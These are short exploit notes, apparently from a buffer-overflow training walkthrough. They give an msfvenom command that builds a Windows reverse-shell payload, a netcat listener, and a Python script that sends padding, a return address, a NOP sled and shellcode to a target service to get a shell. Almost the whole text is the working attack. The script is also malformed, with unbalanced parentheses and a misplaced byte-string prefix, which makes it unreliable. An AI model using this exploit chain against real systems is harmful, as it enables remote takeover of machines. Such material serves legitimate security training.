### Msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -f c -a x86 -b "\x00"

-b is the bad characters from earlier
 
### Nc -nlvp 4444
 
Gedit 6.py  
#!/usr/bin/python3  
import sys, socket
 
overflow = (  
b"<paste_msfvenom_payload>"  
b"<………..>"  
b"<………..>"  
)
 
shellcode = b"A" * <offset> + b"<return_address_in_reverse_bytes>" ((\xaf\x11\x50\x62)) + b"\x90"*32 + overflow
 
try:  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
s.connect(("<IP>",<PORT>))  
payload = "b<Cmd_to_overflow> /.:/" + shellcode))  
s.send((payload))
 
s.close()
 
except:  
print("Error connecting to server")  
sys.exit()
 
### chmod +x 6.py

### ./6.py
 
Shell